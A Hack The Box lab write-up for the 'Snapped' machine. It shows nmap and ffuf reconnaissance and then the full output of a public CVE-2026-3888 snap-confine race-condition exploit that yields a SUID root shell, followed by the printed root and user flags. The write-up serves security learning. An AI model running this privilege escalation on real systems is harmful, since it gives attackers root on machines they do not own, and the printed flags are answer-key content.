# Snapped HTB Hard Machine Writeup

## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV 10.129.16.206 -v
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-04 14:35 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:35
Completed NSE at 14:35, 0.00s elapsed
Initiating NSE at 14:35
Completed NSE at 14:35, 0.00s elapsed
Initiating NSE at 14:35
Completed NSE at 14:35, 0.00s elapsed
Initiating Ping Scan at 14:35
Scanning 10.129.16.206 [4 ports]
Completed Ping Scan at 14:35, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:35
Completed Parallel DNS resolution of 1 host. at 14:35, 0.50s elapsed
Initiating SYN Stealth Scan at 14:35
Scanning 10.129.16.206 [1000 ports]
Discovered open port 80/tcp on 10.129.16.206
Discovered open port 22/tcp on 10.129.16.206
Completed SYN Stealth Scan at 14:35, 2.36s elapsed (1000 total ports)
Initiating Service scan at 14:35
Scanning 2 services on 10.129.16.206
Completed Service scan at 14:35, 6.37s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.16.206.
Initiating NSE at 14:35
Completed NSE at 14:35, 5.61s elapsed
Initiating NSE at 14:35
Completed NSE at 14:35, 0.74s elapsed
Initiating NSE at 14:35
Completed NSE at 14:35, 0.00s elapsed
Nmap scan report for 10.129.16.206
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://snapped.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 14:35
Completed NSE at 14:35, 0.00s elapsed
Initiating NSE at 14:35
Completed NSE at 14:35, 0.00s elapsed
Initiating NSE at 14:35
Completed NSE at 14:35, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.31 seconds
           Raw packets sent: 1103 (48.508KB) | Rcvd: 1002 (40.076KB)
                                                                             
```
## Web Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://snapped.htb/FUZZ -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snapped.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 20199, Words: 5035, Lines: 540, Duration: 186ms]
index.html              [Status: 200, Size: 20199, Words: 5035, Lines: 540, Duration: 180ms]
:: Progress: [4614/4614] :: Job [1/1] :: 204 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
```
Later with ffuf subdomains, find `admin.snapped.htb`

For more details: 
- https://sn0xs-organization.gitbook.io/sn0x-order.org/hack-the-box-writeups/htb-machines/hard/linux/htb-snapped
- https://github.com/karimelsheikh1/HTB-Snapped-Writeup
- https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
## Get root flag
```bash
jonathan@snapped:~$ ./exploit ./librootshell.so 
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell.so (9056 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 2835

[Phase 2] Waiting for .snap deletion...
[*] Polling (up to 30 days on stock Ubuntu).
[*] Hint: use -s to skip.
^[[1;5D^[[1;5D[+] .snap deleted.

[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_KqWWnn//dev: No such file or directory
[+] Namespace destroyed.

[Phase 4] Setting up and running the race...
[*]   Working directory: /proc/2835/cwd
[*]   Building .snap and .exchange...
[*]   285 entries copied to exchange directory
[*]   Starting race...
[*]   Monitoring snap-confine (child PID 3286)...

[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[*]   ld-linux in namespace: jonathan:jonathan 755
[+]   Poisoned namespace PID: 3286

[Phase 5] Injecting payload into poisoned namespace...
[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
[*]   Planting busybox...
[*]   Writing escape script → /tmp/sh
[*]   Overwriting ld-linux-x86-64.so.2...
[+]   Payload injected.

[Phase 6] Triggering root via SUID snap-confine...
[*]   snap-confine → snap-confine (SUID trigger)
[*]   Exit status: 0

[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
[*] Cleaning up background processes...

================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================

bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
bash-5.1# cat root/root.txt
cat: root/root.txt: No such file or directory
bash-5.1# cat /root/root.txt
3dd0715e9fa4d89cc8d84555a0d81af3
bash-5.1# cat /home/jonathan/user.txt
e0ce647fc578fbea033e8ce35602449c
bash-5.1# 

```